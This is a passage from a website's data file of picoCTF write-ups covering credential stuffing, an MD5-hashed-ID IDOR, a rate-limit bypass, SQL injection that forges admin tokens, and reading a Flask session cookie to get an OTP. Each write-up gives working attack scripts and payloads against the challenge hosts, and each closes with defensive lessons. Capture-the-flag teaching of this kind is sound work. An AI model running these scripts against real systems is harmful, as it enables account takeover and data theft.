nc green-hill.picoctf.net 57942
3e8
\`\`\`

The service returned:

\`\`\`text
Access granted: }1a9ftc_oc_ipb50aftc_oc_ip8_99ftc_oc_ip9_TGftc_oc_ip_xehftc_oc_ip_tigftc_oc_ipid_3ftc_oc_ip{FTCftc_oc_ipocipftc_oc_ip
\`\`\`

## Decoding the Flag

First remove every \`ftc_oc_ip\` substring:

\`\`\`text
}1a9b50a8_999_TG_xeh_tigid_3{FTCocip
\`\`\`

Then reverse the remaining string:

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Final Answer

Input that grants access:

\`3e8\`

Recovered flag:

\`picoCTF{<redacted>}\`

## Short Takeaway

This challenge is a straightforward binary RE task:

- recover validation logic from \`main\`
- find the minimal passing input
- inspect the flag printing routine
- undo the output transformation

The only trick is that the flag is not printed directly. It is reversed and padded with repeated junk text, so you need to clean it before reading the final result.
`},{id:`credential-stuffing`,title:`Credential Stuffing`,excerpt:`picoCTF Credential Stuffing writeup using leaked credential databases to automate login attempts and gain unauthorized access to the target application.`,category:`picoCTF - Web Exploitation`,content:`# Credential Stuffing

## Challenge Summary

This picoCTF challenge demonstrates a classic credential stuffing attack. The premise is that a large department store suffered a breach, and a dump of stolen usernames and passwords was released. The goal is to take those leaked credentials and test them against another target, a local bank service, in the hope that at least one user reused the same password.

The service was exposed over a raw TCP connection and could be reached with:

\`\`\`bash
nc crystal-peak.picoctf.net 53447
\`\`\`

A credential file was also provided:

\`\`\`text
creds-dump.txt
\`\`\`

The task was to identify a valid reused credential and retrieve the flag.

## Concepts Tested

This challenge is built around the real-world weakness of password reuse.

When a user reuses the same username and password across multiple services:

- A breach on one site can become an entry point into a completely different site.
- Attackers do not need to crack hashes if they already have plaintext credentials.
- Automated login attempts across many accounts can produce account takeover very quickly.

That workflow is called credential stuffing.

## Initial Recon

The first step was to inspect the credential dump and confirm its structure.

\`\`\`bash
sed -n '1,20p' creds-dump.txt
\`\`\`

Example entries looked like this:

\`\`\`text
rora;winner1
birendra;rumble
khalid;sting
stanislaw;ming
maged;nimrod
\`\`\`

This immediately showed that each line contained:

- A username
- A semicolon separator
- A password

So the dump was already formatted for direct login attempts.

## Understanding the Target Service

Connecting to the service manually showed a simple username/password prompt:

\`\`\`bash
nc crystal-peak.picoctf.net 53447
\`\`\`

The service responded with:

\`\`\`text
=========================================
Welcome to the Online Banking Service!
=========================================

Please enter your username & password to login.
Username:
\`\`\`

After entering a username, it prompted for a password. Invalid attempts returned:

\`\`\`text
Invalid username or password
\`\`\`

That confirmed three important things:

- The service was interactive and line-based.
- No browser automation was needed.
- The challenge could be solved by repeatedly opening a connection, sending one username/password pair, and checking the response.

## First Approach

The obvious first approach was to test credentials directly using \`nc\` in a loop.

A simple conceptual version looks like this:

\`\`\`bash
while IFS=';' read -r user pass; do
  printf '%s\\n%s\\n' "$user" "$pass" | nc crystal-peak.picoctf.net 53447
done < creds-dump.txt
\`\`\`

In practice, raw loops over \`nc\` can be unreliable because:

- Some sessions close early.
- Some responses can be incomplete.
- Transient network issues can look like successful logins if you only check for missing error text.

During testing, a few false positives appeared when the connection dropped before the full invalid message was returned. That meant the scan needed to be more careful.

## Reliable Solution Strategy

Instead of trusting one-shot \`nc\` output blindly, the better approach was:

1. Open a connection.
2. Wait until the \`Username:\` prompt is received.
3. Send the username.
4. Wait until the \`Password:\` prompt is received.
5. Send the password.
6. Read the server's response.
7. Treat the result as valid only if a complete non-error response is returned.
8. Retry incomplete sessions rather than assuming they are hits.

This avoids mistaking network noise for successful authentication.

## Scripted Credential Stuffing

A small socket-based script was used to automate the process safely and accurately. The logic was:

- Read each \`username;password\` pair from \`creds-dump.txt\`
- Connect to the service
- Follow the prompts exactly
- Reject responses containing \`Invalid username or password\`
- Stop on the first real success

A representative version of the solution is below:

\`\`\`python
import socket
import time

HOST = "crystal-peak.picoctf.net"
PORT = 53447


def recv_until(sock, marker, timeout=3):
    sock.settimeout(timeout)
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


with open("creds-dump.txt", "r", encoding="utf-8", errors="replace") as f:
    for line in f:
        line = line.strip()
        if not line or ";" not in line:
            continue

        user, password = line.split(";", 1)

        try:
            s = socket.create_connection((HOST, PORT), timeout=3)
            banner = recv_until(s, b"Username: ")
            if b"Username: " not in banner:
                s.close()
                continue

            s.sendall(user.encode() + b"\\n")

            prompt = recv_until(s, b"Password: ")
            if b"Password: " not in prompt:
                s.close()
                continue

            s.sendall(password.encode() + b"\\n")

            time.sleep(0.2)
            s.settimeout(1.5)
            response = b""

            while True:
                try:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break

            s.close()

            output = (banner + prompt + response).decode("utf-8", "replace")

            if "Invalid username or password" not in output and response.strip():
                print(f"[+] Valid credential found: {user}:{password}")
                print(output)
                break

        except Exception:
            continue
\`\`\`

## Successful Credential Pair

The valid reused bank credential was:

\`\`\`text
tandie:griffith
\`\`\`

Once that pair was submitted to the service, the response was:

\`\`\`text
Authenticating...
Welcome tandie!
picoCTF{<redacted>}
\`\`\`

## Flag

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Why This Worked

This worked because one user reused their department store credentials on the online banking service. The leaked dump effectively became a ready-made login list for another platform.

The challenge mirrors a real attack path:

- Site A is breached.
- Credentials are leaked.
- Attackers test those credentials against Site B, Site C, Site D, and so on.
- Any reused credential becomes an account takeover.

No password cracking was required. No exploitation of the bank application itself was required. The weakness was entirely in credential reuse.

## Security Lessons

This challenge reinforces several practical defenses:

- Users should never reuse passwords across different services.
- Password managers reduce reuse by making unique passwords easy.
- Multi-factor authentication can prevent account takeover even if a password is reused.
- Login monitoring and rate limiting can help detect or slow credential stuffing attempts.
- Breached password checks should be integrated into authentication systems.

## Takeaway

The important lesson here is that authentication security is not only about protecting one application in isolation. A completely different site's breach can compromise your users if they reuse credentials. Credential stuffing succeeds because users treat passwords as reusable secrets, while attackers treat them as transferable assets.

In this challenge, the entire compromise came down to one reused pair:

\`\`\`text
tandie:griffith
\`\`\`

That single mistake revealed the flag:

\`\`\`text
picoCTF{<redacted>}
\`\`\`
`},{id:`hashgate`,title:`Hashgate`,excerpt:`picoCTF Hashgate writeup exploiting an IDOR vulnerability where user IDs are hashed with MD5, allowing access to other users accounts by predicting hash values.`,category:`picoCTF - Web Exploitation`,content:`# Hashgate

## Challenge Summary

This picoCTF web challenge exposed a company portal with a standard login page and a hint that there were only about 20 employees in the organisation. The prompt also pointed out that the profile ID check was not using plain text, suggesting that some one-way function was involved.

Target:

\`\`\`text
http://crystal-peak.picoctf.net:57973/
\`\`\`

The objective was to reach the admin's profile and recover the flag.

## Initial Recon

Opening the main page showed a login form. The HTML source contained a helpful comment that leaked valid guest credentials:

\`\`\`html
<!-- Email: guest@picoctf.org Password: guest -->
\`\`\`

That meant the first useful step was to authenticate as the guest user and inspect what happened after login.

## Login Request

The frontend submitted credentials as JSON to \`/login\`:

\`\`\`http
POST /login
Content-Type: application/json

{"email":"guest@picoctf.org","password":"guest"}
\`\`\`

The server responded with a redirect:

\`\`\`http
HTTP/1.1 302 Found
Location: /profile/user/e93028bdc1aacdfb3687181f2031765d
\`\`\`

So the profile route looked like:

\`\`\`text
/profile/user/<hashed_value>
\`\`\`

## Inspecting the Guest Profile

Requesting the redirected profile returned:

\`\`\`text
Access level: Guest (ID: 3000). Insufficient privileges to view classified data. Only top-tier users can access the flag.
\`\`\`

This revealed an important detail:

- The guest account had numeric ID \`3000\`
- The URL used a 32-character hexadecimal value
- That strongly suggested a hash, likely MD5

## Verifying the Hash Function

To test whether the URL value was simply the hash of the numeric ID:

\`\`\`bash
printf '3000' | md5sum
\`\`\`

The result was:

\`\`\`text
e93028bdc1aacdfb3687181f2031765d
\`\`\`

That exactly matched the value in the guest profile URL.

So the application was building profile paths like this:

\`\`\`text
/profile/user/md5(user_id)
\`\`\`

This is not real authorization. It is only identifier obfuscation.

## Vulnerability

The bug is an insecure direct object reference, or IDOR.

The application assumed that hashing the internal numeric ID would hide other users' profiles. But if an attacker can infer:

- the hashing function
- the input format
- the likely ID range

then the attacker can compute other valid profile URLs directly.

Because the challenge stated there were only about 20 employees, brute-forcing nearby numeric IDs was trivial.

## Exploitation Strategy

The guest account was \`ID 3000\`, so the most likely admin account would be in a nearby range. The plan was:

1. Generate MD5 hashes for candidate IDs
2. Request \`/profile/user/<md5(id)>\`
3. Stop when a valid non-guest profile appeared

Example enumeration logic:

\`\`\`python
import hashlib
import urllib.request
import urllib.error

for i in range(2990, 3011):
    h = hashlib.md5(str(i).encode()).hexdigest()
    url = f"http://crystal-peak.picoctf.net:57973/profile/user/{h}"

    try:
        with urllib.request.urlopen(url) as r:
            body = r.read().decode()
        print(i, body)
    except urllib.error.HTTPError as e:
        print(i, "HTTP", e.code)
\`\`\`

## Successful Result

Enumeration showed that \`3010\` was the admin profile:

\`\`\`text
3010 Welcome, admin! Here is the flag: picoCTF{<redacted>}
\`\`\`

To confirm the exact admin URL:

\`\`\`bash
printf '3010' | md5sum
\`\`\`

Output:

\`\`\`text
281642b3b16d4a7c98e9ccdf7ba4c6c2
\`\`\`

So the admin profile endpoint was:

\`\`\`text
http://crystal-peak.picoctf.net:57973/profile/user/281642b3b16d4a7c98e9ccdf7ba4c6c2
\`\`\`

Requesting that endpoint returned the flag.

## Flag

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Why the Defense Failed

The application tried to protect profile access by hiding the raw numeric ID behind a hash. That fails for two reasons:

1. Hashing is not authorization.
2. The ID space was tiny and predictable.

Since the guest profile disclosed \`ID: 3000\`, an attacker immediately had a starting point. With only about 20 employees, testing nearby IDs was enough to recover the admin profile.

This is a common design mistake:

- Developers hide direct identifiers
- They assume hidden means protected
- Attackers enumerate the underlying values anyway

## Security Lessons

- Never rely on hashed or encoded object IDs as an access control mechanism.
- Every request for a resource must enforce server-side authorization.
- If a user requests another user's profile, the server must verify they are allowed to access it.
- Predictable identifier spaces make brute-force enumeration easy even when IDs are transformed.

## Takeaway

This challenge was solved by recognizing that the profile path used \`md5(user_id)\` instead of a secure access-control check. Once the guest profile exposed \`ID 3000\`, the rest became a small enumeration problem. Testing nearby IDs revealed that \`3010\` belonged to the admin account, and its hashed value led directly to the flag.

Final admin URL:

\`\`\`text
/profile/user/281642b3b16d4a7c98e9ccdf7ba4c6c2
\`\`\`

Final flag:

\`\`\`text
picoCTF{<redacted>}
\`\`\`
`},{id:`fool-the-lockout`,title:`Fool the Lockout`,excerpt:`picoCTF Fool the Lockout writeup bypassing a rate-limiting lockout mechanism to brute-force credentials and access the protected endpoint.`,category:`picoCTF - Web Exploitation`,content:`# Fool the Lockout

## Challenge Summary

This picoCTF challenge provided three important pieces:

- A live login page
- The full Flask source code
- A credential dump containing candidate username/password pairs

Target:

\`\`\`text
http://candy-mountain.picoctf.net:52910/login
\`\`\`

Files provided:

- \`app.py\`
- \`creds-dump (1).txt\`

The goal was to bypass the IP-based rate limit, find the valid credential pair, log in, and capture the flag.

## Key Observation

The challenge explicitly claimed that brute forcing was prevented by an IP-based rate limit. That meant the source code mattered more than the login form itself.

So the first step was to read \`app.py\`.

## Source Code Analysis

The relevant rate-limiting logic was:

\`\`\`python
MAX_REQUESTS = 10
EPOCH_DURATION = 30
LOCKOUT_DURATION = 120
\`\`\`

The application tracked requests by \`request.remote_addr\` and updated a small in-memory database:

\`\`\`python
request_rates = {
    "ip_addr": {
        "num_requests": int,
        "epoch_start": timestamp,
        "lockout_until": int
    }
}
\`\`\`

The critical logic was inside \`refresh_request_rates_db()\` and \`exceeded_rate_limit()\`.

### How the lockout worked

For each client IP:

- Every \`POST\` to \`/login\` increased \`num_requests\`
- If more than 30 seconds passed since \`epoch_start\`, the request counter reset to \`0\`
- Lockout happened only when:

\`\`\`python
if request_rates[client_ip]['num_requests'] > MAX_REQUESTS:
\`\`\`

Since \`MAX_REQUESTS = 10\`, this means:

- Attempts \`1\` through \`10\` are allowed
- Attempt \`11\` within the same 30-second window triggers the lockout

That is the flaw.

## Vulnerability

The defense was not actually preventing guessing. It only limited the attacker to 10 guesses every 30 seconds from one IP.

So instead of brute forcing quickly, the correct bypass was simply to pace the requests:

1. Send 10 login attempts
2. Wait a little more than 30 seconds
3. Repeat

Because the epoch resets after 30 seconds, the counter returns to zero and the attacker gets another 10 attempts without ever triggering the lockout.

This is not a real brute-force prevention mechanism. It is only a speed bump.

## Why Header Spoofing Was Not Needed

Sometimes IP-based limits can be bypassed with headers like:

- \`X-Forwarded-For\`
- \`X-Real-IP\`

But in this application the code used:

\`\`\`python
client_ip = request.remote_addr
\`\`\`

So spoofed headers would not help unless there were a reverse proxy in front rewriting \`remote_addr\`, which there was not in this challenge.

The reliable bypass was timing, not header manipulation.

## Recon on the Login Form

Fetching the login page confirmed the form fields:

\`\`\`html
<input id="username" name="username" type="text">
<input id="password" name="password" type="password">
\`\`\`

So login requests needed standard form data:

\`\`\`text
username=<value>&password=<value>
\`\`\`

## Credential Dump

The dump contained 99 username/password pairs in the format:

\`\`\`text
username;password
\`\`\`

Example:

\`\`\`text
rora;winner1
birendra;rumble
khalid;sting
stanislaw;ming
...
\`\`\`

Since the file was small, a paced scan was practical.

## Exploitation Strategy

The correct attack plan was:

1. Read the credential dump
2. Submit 10 login attempts
3. Sleep for 31 seconds so the 30-second epoch expires
4. Continue with the next batch
5. Stop on the first successful redirect to \`/\`

That keeps the scan permanently below the lockout condition.

## Scripted Solution

The challenge hint mentioned that the Python \`requests\` library might be useful. That was exactly the right tool.

A working solution looked like this:

\`\`\`python
import time
import requests
from urllib.parse import urljoin

BASE = "http://candy-mountain.picoctf.net:52910"
LOGIN = urljoin(BASE, "/login")
HOME = urljoin(BASE, "/")

pairs = []
with open("creds-dump (1).txt", encoding="utf-8", errors="replace") as f:
    for line in f:
        line = line.rstrip("\\n")
        if ";" in line:
            pairs.append(tuple(line.split(";", 1)))

s = requests.Session()
attempts_in_epoch = 0

for user, pwd in pairs:
    if attempts_in_epoch == 10:
        time.sleep(31)
        attempts_in_epoch = 0

    r = s.post(
        LOGIN,
        data={"username": user, "password": pwd},
        allow_redirects=False,
        timeout=10
    )
    attempts_in_epoch += 1

    if r.status_code in (301, 302, 303, 307, 308) and r.headers.get("Location") == "/":
        home = s.get(HOME, timeout=10)
        print(f"[+] Found valid creds: {user}:{pwd}")
        print(home.text)
        break
\`\`\`

## Valid Credential Pair

The valid account in the dump was:

\`\`\`text
rohit:berry
\`\`\`

After logging in with that pair, the homepage displayed the flag.

## Flag

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Why the Defense Failed

The application did not stop credential guessing. It only enforced a per-IP attempt cap inside a short time window.

That means:

- It slowed guessing down
- It did not stop guessing
- It still allowed the full dump to be tested eventually

The bug is a weak rate-limiting design, not a single line coding mistake.

The developer assumed that "blocking fast guessing" meant "guessing is impossible." That assumption was wrong.

## Security Lessons

- Rate limiting should be combined with stronger protections, not used alone.
- Lockouts based only on IP are weak, especially against distributed attacks.
- Time-window rate limits can often be bypassed by simply pacing requests.
- MFA and anomaly detection are far more effective against credential attacks.
- Real defenses should consider account-based controls, IP reputation, device fingerprinting, and breached-password detection.

## Takeaway

This challenge was solved by reading the source carefully instead of fighting the lockout directly. The application allowed 10 attempts every 30 seconds, so the right move was to stay just under that threshold and walk through the credential dump patiently.

The winning credential pair was:

\`\`\`text
rohit:berry
\`\`\`

And the recovered flag was:

\`\`\`text
picoCTF{<redacted>}
\`\`\`
`},{id:`secret-box`,title:`Secret Box`,excerpt:`picoCTF Secret Box writeup exploiting SQL injection to forge authentication tokens and access the secret content containing the flag.`,category:`picoCTF - Web Exploitation`,content:`# Secret Box

## Challenge Summary

This picoCTF challenge presented a small secret-sharing web app and claimed that only each user could see their own secrets. The goal was to recover the admin's secret from the live site.

Target:

\`\`\`text
http://candy-mountain.picoctf.net:52404/
\`\`\`

Provided file:

- \`source.tar.gz\`

The source code was the key to solving the challenge.

## Initial Analysis

After extracting the archive, the important files were:

- \`app/src/server.js\`
- \`app/src/handler.js\`
- \`app/src/db.js\`
- \`db/initdb.sql\`

The database initialization file showed a seeded admin account and admin secret:

\`\`\`sql
INSERT INTO users(id, username, password) VALUES ('e2a66f7d-2ce6-4861-b4aa-be8e069601cb', 'admin', 'fake_password');
INSERT INTO secrets(owner_id, content) VALUES ('e2a66f7d-2ce6-4861-b4aa-be8e069601cb', 'picoCTF{<redacted>}');
\`\`\`

Later, \`db.js\` replaced those placeholders with the real password and flag from environment variables:

\`\`\`js
await db('users')
  .where({ id: 'e2a66f7d-2ce6-4861-b4aa-be8e069601cb' })
  .update({ password: process.env.USERPASSWORD });

await db('secrets')
  .where({ owner_id: 'e2a66f7d-2ce6-4861-b4aa-be8e069601cb' })
  .update({ content: process.env.FLAG });
\`\`\`

So the admin UUID was fixed and known:

\`\`\`text
e2a66f7d-2ce6-4861-b4aa-be8e069601cb
\`\`\`

## Looking for the Injection Point

Most of the queries were parameterized safely. For example, login used:

\`\`\`js
const userResult = await db.raw(
  \`SELECT * FROM users WHERE username = ? AND password = ? LIMIT 1\`,
  [username, password]
);
\`\`\`

The vulnerable route was \`POST /secrets/create\`:

\`\`\`js
app.post('/secrets/create', authMiddleware, async (req, res) => {
  const userId = req.userId;
  if (!userId){
    res.clearCookie('auth_token');
    return res.redirect('/');
  }

  const content = req.body.content;
  const query = await db.raw(
    \`INSERT INTO secrets(owner_id, content) VALUES ('\${userId}', '\${content}')\`
  );

  return res.redirect('/');
});
\`\`\`

This is classic SQL injection:

- \`userId\` is interpolated directly
- \`content\` is interpolated directly
- the query is not parameterized

That means any authenticated user can break out of the string inside \`content\` and run arbitrary SQL.

## Exploitation Strategy

The cleanest approach was:

1. Sign up as a normal user
2. Log in normally
3. Use the SQL injection in \`/secrets/create\` to insert a valid token for the admin user
4. Replace the browser cookie \`auth_token\` with the forged admin token
5. Visit \`/\` and read the admin's secret

This works because the authentication middleware trusts the \`tokens\` table:

\`\`\`js
const query = await db.raw(
  \`SELECT * FROM tokens WHERE id = ? AND expired_at > NOW()\`,
  [token]
);
\`\`\`

If we can insert our own row into \`tokens\` with:

- a token ID we choose
- \`user_id\` set to the admin UUID

then the server will accept us as admin.

## Injection Payload

The original vulnerable query looked like:

\`\`\`sql
INSERT INTO secrets(owner_id, content) VALUES ('<userId>', '<content>')
\`\`\`

So the payload can terminate the \`content\` string, close the \`VALUES\` clause, and add a second SQL statement:

\`\`\`sql
x'); INSERT INTO tokens(id, user_id) VALUES ('MYTOKEN', 'e2a66f7d-2ce6-4861-b4aa-be8e069601cb');--
\`\`\`

This transforms the query into:

\`\`\`sql
INSERT INTO secrets(owner_id, content) VALUES ('<our_user_id>', 'x');
INSERT INTO tokens(id, user_id) VALUES ('MYTOKEN', 'e2a66f7d-2ce6-4861-b4aa-be8e069601cb');
--')
\`\`\`

The trailing \`--\` comments out the leftover characters.

## Working Exploit Script

A working solution using Python \`requests\`:

\`\`\`python
import requests
import uuid

BASE = "http://candy-mountain.picoctf.net:52404"
ADMIN_ID = "e2a66f7d-2ce6-4861-b4aa-be8e069601cb"

username = "u" + uuid.uuid4().hex[:8]
password = "p" + uuid.uuid4().hex[:8]
forged_token = "tok_" + uuid.uuid4().hex

s = requests.Session()

# create user
s.post(BASE + "/signup", data={
    "username": username,
    "password": password
})

# log in as the new user
s.post(BASE + "/login", data={
    "username": username,
    "password": password
})

# SQL injection to insert an admin token we control
payload = (
    "x'); INSERT INTO tokens(id, user_id) VALUES "
    f"('{forged_token}', '{ADMIN_ID}');--"
)

s.post(BASE + "/secrets/create", data={
    "content": payload
})

# replace cookie with forged admin token
s.cookies.set("auth_token", forged_token, domain="candy-mountain.picoctf.net", path="/")

# read admin secrets
r = s.get(BASE + "/")
print(r.text)
\`\`\`

## Result

After forging an admin token and reloading the homepage, the admin's secret was displayed:

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Flag

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Why This Worked

The application made two critical mistakes:

1. It built SQL in \`/secrets/create\` using string interpolation.
2. It trusted database-backed tokens without any additional integrity checks.

Once arbitrary SQL execution was available, creating an admin session became easier than trying to guess the admin password.

## Security Lessons

- Never build SQL queries with string interpolation.
- Use parameterized queries consistently, especially on insert routes.
- Treat session and token tables as sensitive authentication state.
- A low-privilege SQL injection often becomes full authentication bypass.
- Knowing a fixed admin UUID or user ID can make privilege escalation trivial.

## Takeaway

This was not solved by logging in as admin directly. Instead, it was solved by creating a normal user account, abusing the SQL injection in secret creation, inserting a valid admin token into the database, and then presenting that token back to the server.

Recovered flag:

\`\`\`text
picoCTF{<redacted>}
\`\`\`
`},{id:`no-fa`,title:`No FA`,excerpt:`picoCTF No FA writeup exploiting Flask session cookie vulnerabilities to leak OTP codes and crack passwords for authentication bypass.`,category:`picoCTF - Web Exploitation`,content:`# No FA

## Challenge Summary

This picoCTF challenge provided:

- A live login portal
- The application source code
- A leaked SQLite database
- Repeated hints about \`rockyou\`

Target:

\`\`\`text
http://foggy-cliff.picoctf.net:55737/login
\`\`\`

Provided files:

- \`app (1).py\`
- \`users.db\`
- \`rockyou\`

The objective was to recover the flag from the admin account.

## Initial Analysis

The leaked database contained a \`users\` table with usernames, emails, password hashes, and a \`two_fa\` flag.

The important admin row looked like this:

\`\`\`text
username: admin
email: iamadmin@nfs.com
password: c20fa16907343eef642d10f0bdb81bf629e6aaf6c906f26eabda079ca9e5ab67
two_fa: 1
\`\`\`

So admin used 2FA, while most other users did not.

## Source Code Review

The login route verified passwords with SHA-256:

\`\`\`python
if user and hashlib.sha256(password.encode()).hexdigest() == user['password']:
\`\`\`

If the user had 2FA enabled, the app generated a 4-digit OTP and stored it in the Flask session:

\`\`\`python
otp = str(random.randint(1000, 9999))
session['otp_secret'] = otp
session['otp_timestamp'] = time.time()
session['username'] = username
session['logged'] = 'false'
return redirect(url_for('two_fa'))
\`\`\`

That is the critical design flaw.

## Why This Is Vulnerable

Flask’s default session mechanism stores data on the client side in a signed cookie. The cookie is protected against modification if the secret key is unknown, but the contents are not encrypted.

That means if the server stores sensitive values such as:

- \`otp_secret\`
- \`username\`
- timestamps

inside the session, the browser can still read them.

So even without forging the session, the OTP can simply be extracted from the cookie after a successful password login.

## Step 1: Crack the Admin Password

The repeated \`rockyou\` hint strongly suggested offline password cracking.

The admin password hash from \`users.db\` was:

\`\`\`text
c20fa16907343eef642d10f0bdb81bf629e6aaf6c906f26eabda079ca9e5ab67
\`\`\`

Using \`rockyou.txt\` against SHA-256 recovered:

\`\`\`text
apple@123
\`\`\`

So the admin credentials were:

\`\`\`text
admin : apple@123
\`\`\`

## Step 2: Trigger the OTP Flow

Logging in with the recovered password redirected to \`/two_fa\` and issued a Flask session cookie.

That cookie looked like:

\`\`\`text
.eJwty0sKgCAQANC7zFoCtcnyMiE5ieAPnVbR3WvR9sG7IdUQyIOF06VBIKBy2wcdnfjDWWr9G8dMg11uYKUxWklElJPaDC6rgGtQLy7Td5zPscDzAirgHCg.abEfPw.BsVwFapCHik_B_IMNs8eow2stfY
\`\`\`

## Step 3: Decode the Flask Session Cookie

The Flask session cookie payload can be decoded without knowing the secret key.

Decoded content:

\`\`\`json
{"logged":"false","otp_secret":"4133","otp_timestamp":1773215551.660..., "username":"admin"}
\`\`\`

The key point is that the OTP was directly visible:

\`\`\`text
4133
\`\`\`

So there was no need to brute-force 2FA at all.

## Example Cookie Decoder

This is enough to extract the OTP from the session cookie:

\`\`\`python
import base64
import zlib
import json

cookie = "<session_cookie_here>"

payload = cookie.split('.')[1] if cookie.startswith('.') else cookie.split('.')[0]
raw = base64.urlsafe_b64decode(payload + '=' * (-len(payload) % 4))

try:
    data = zlib.decompress(raw)
except Exception:
    data = raw

print(json.loads(data))
\`\`\`

## Full Exploit Flow

A working approach:

1. Crack the leaked admin SHA-256 hash with \`rockyou\`
2. Log in as \`admin\` with \`apple@123\`
3. Read the \`session\` cookie
4. Decode the cookie and extract \`otp_secret\`
5. Submit the extracted OTP to \`/two_fa\`
6. Load \`/\` and read the flag

## Scripted Solution

\`\`\`python
import requests
import base64
import zlib
import json

BASE = "http://foggy-cliff.picoctf.net:55737"

s = requests.Session()

# Login with cracked admin password
s.post(BASE + "/login", data={
    "username": "admin",
    "password": "apple@123"
}, allow_redirects=False)

cookie = s.cookies.get("session")

# Decode OTP from Flask session cookie
payload = cookie.split('.')[1] if cookie.startswith('.') else cookie.split('.')[0]
raw = base64.urlsafe_b64decode(payload + '=' * (-len(payload) % 4))

try:
    data = zlib.decompress(raw)
except Exception:
    data = raw

session_data = json.loads(data)
otp = session_data["otp_secret"]

# Complete 2FA
s.post(BASE + "/two_fa", data={"otp": otp}, allow_redirects=False)

# Read flag
r = s.get(BASE + "/")
print(r.text)
\`\`\`

## Flag

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Why This Worked

The challenge combined two weaknesses:

1. The leaked database exposed password hashes, allowing offline cracking.
2. The OTP secret was stored client-side in the Flask session cookie.

So even though admin had 2FA enabled, the second factor was not truly secret. Once the password was cracked, the OTP was exposed by the application itself.

## Security Lessons

- Do not store OTP secrets client-side in readable cookies.
- Signed cookies protect integrity, not confidentiality.
- Sensitive authentication state should be stored server-side.
- Leaked password databases make weak passwords trivial to recover offline.
- 2FA is ineffective if the OTP is exposed to the client before verification.

## Takeaway

This challenge was solved by combining offline password cracking with session cookie inspection. The admin password came from the leaked SHA-256 hash, and the second factor was recovered directly from the Flask session because it was only signed, not encrypted.

Recovered admin password:

\`\`\`text
apple@123
\`\`\`

Recovered flag:

\`\`\`text
picoCTF{<redacted>}
\`\`\`
`},{id:`sql-map1`,title:`Sql Map1`,excerpt:`picoCTF SQL Map 1 writeup using sqlmap to automate SQL injection attacks and extract password hashes, then cracking them with MD5 lookup.`,category:`picoCTF - Web Exploitation`,content:`# Sql Map1

## Challenge Summary

This picoCTF challenge exposed a login portal and hinted very strongly at SQL injection and weak password storage.

Target:

\`\`\`text
http://lonely-island.picoctf.net:65472/
\`\`\`

Important hints:

- \`sqlmap -u <URL_for_search> --cookie="PHPSESSID=1111111111111" -p <vulnerable_parameter> --batch --tables\`
- \`Passwords should not be stored in md5 format\`

The goal was to retrieve the real flag by abusing the vulnerable search feature and then acting as a legitimate user.

## Initial Recon

The landing page was a normal login/register screen.

I first fetched the homepage to confirm the app structure and cookie behavior:

\`\`\`bash
curl -i -s http://lonely-island.picoctf.net:65472/
\`\`\`

### Why this command

- \`curl\` fetches the page directly
- \`-i\` includes response headers
- \`-s\` keeps output clean

### What it showed

- The app used PHP
- A \`PHPSESSID\` cookie was set
- The login form posted to \`login.php\`
- There was also a \`register.php\`

## Login With Known Credentials

You provided the valid credentials:

\`\`\`text
pico : pico
\`\`\`

So the next step was to authenticate and load the post-login page.

### Login request

\`\`\`bash
curl -i -s -c /tmp/sqlmap1.cookies -b /tmp/sqlmap1.cookies \\
  -d 'username=pico&password=pico' \\
  http://lonely-island.picoctf.net:65472/login.php
\`\`\`

### Why this command

- \`-c /tmp/sqlmap1.cookies\` stores the PHP session cookie
- \`-b /tmp/sqlmap1.cookies\` reuses the same cookie jar
- \`-d\` submits POST form fields

### Result

The server responded with:

\`\`\`http
Location: vuln.php
\`\`\`

That revealed the authenticated search page.

### Follow the redirect and inspect the page

\`\`\`bash
curl -s -c /tmp/sqlmap1.cookies -b /tmp/sqlmap1.cookies \\
  -d 'username=pico&password=pico' \\
  http://lonely-island.picoctf.net:65472/login.php -L | sed -n '1,220p'
\`\`\`

### Why this command

- \`-L\` follows redirects automatically
- \`sed -n '1,220p'\` limits output to the useful top portion

### What it showed

The page title was:

\`\`\`text
Vulnerable Flag Search - picoCTF2026
\`\`\`

The search form used:

\`\`\`text
GET /vuln.php?q=<search term>
\`\`\`

So the likely injection point was the \`q\` parameter.

## Baseline Search Behavior

Before attacking the parameter, I checked normal behavior.

\`\`\`bash
curl -s -b /tmp/sqlmap1.cookies \\
  'http://lonely-island.picoctf.net:65472/vuln.php?q=test' | sed -n '1,220p'
\`\`\`

### Result

The app returned:

\`\`\`text
No flags matched your search.
\`\`\`

That gave a clean baseline.

## Quick Injection Probe

Then I tested a quote:

\`\`\`bash
curl -s -b /tmp/sqlmap1.cookies \\
  'http://lonely-island.picoctf.net:65472/vuln.php?q=%27' | sed -n '1,220p'
\`\`\`

### Result

The app did not throw a visible SQL error, but the challenge hint already strongly suggested the parameter was injectable. So the next step was to use \`sqlmap\`.

## Automated Detection With sqlmap

I ran \`sqlmap\` against \`vuln.php?q=test\` and told it to test the \`q\` parameter using the authenticated \`PHPSESSID\`.

\`\`\`bash
sqlmap -u 'http://lonely-island.picoctf.net:65472/vuln.php?q=test' \\
  --cookie='PHPSESSID=9d4efd36cc8f29e077e76d6a2aa5a171' \\
  -p q \\
  --batch \\
  --tables
\`\`\`

### Why this command

- \`-u\` sets the exact vulnerable URL
- \`--cookie=...\` preserves the logged-in session
- \`-p q\` tells \`sqlmap\` which parameter to test
- \`--batch\` answers prompts automatically
- \`--tables\` asks for table enumeration

### What sqlmap found

\`sqlmap\` confirmed:

\`\`\`text
Parameter: q (GET)
Type: boolean-based blind
Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
\`\`\`

and identified the backend as:

\`\`\`text
SQLite
\`\`\`

### Why I did not rely entirely on sqlmap

The small server became unstable during time-based probing, and \`sqlmap\` failed to enumerate tables cleanly from SQLite metadata. So after confirming the injection, I switched to manual UNION-based extraction.

## Manual Column Count Discovery

To use UNION injection, I first determined the number of selected columns.

\`\`\`bash
curl -s -b /tmp/sqlmap1.cookies \\
